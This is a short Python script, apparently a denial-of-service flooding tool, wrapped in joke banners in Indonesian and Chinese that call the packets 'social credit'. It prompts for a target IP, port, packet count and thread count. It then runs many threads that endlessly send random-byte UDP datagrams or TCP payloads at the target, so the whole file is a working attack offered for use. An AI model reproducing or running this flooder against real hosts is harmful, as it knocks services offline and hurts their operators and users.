#NathanCuan...
import random
import socket
import threading

print       (" »»»»»»» 📊 SUPER IDOL TOOLS 📊 ««««««« ")
print       (" TOOLS BY NATHAN ")
print       (" DIJAMIN MENDAPATKAN DIJAMIN SOCIAL CREDIT KALIAN NAIK ")                                   
print       (" OH IYA JANGAN ABUSE KALO MAKE TOOLS ")
print       (" MAU RENAME ? PM ME ")
print       (" ======================================================= ")
print       (" ↓↓ DAN 1 LAGI BACA PERATURAN DI BAWAH INI ↓↓ ")
print       (" 不重命名，累了，如果要重命名，告诉楼主，加楼主水印吧 ")
print       (" ======================================================= ")
print       (" UDAH BACA ? YODAH GAS KEN KIRIM SOCIAL CREDIT ")
print       (" ======================================================= ")
    
ip = str(input("  IP NYA SAYANG :"))
port = int(input(" PORT NYA BEB :"))
times = int(input(" BERAPA SOCIAL CREDIT NYA :"))
threads = int(input(" MAU BERAPA GRAFIK NYA :"))
choice = str(input(" LU OLANG DAH SIAP KIRIM SOCIAL CREDIT ? (y or n) :"))

def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" 📈📈 SOCIAL CREDIT ")
		except:
			print("[!] 💲💲 HAIYA BANYAK CUAN 💲💲")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" 📈📈 SOCIAL CREDIT ")
		except:
			s.close()
			print("[*] 💲💲 HAIYA BANYAK CUAN 💲💲")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
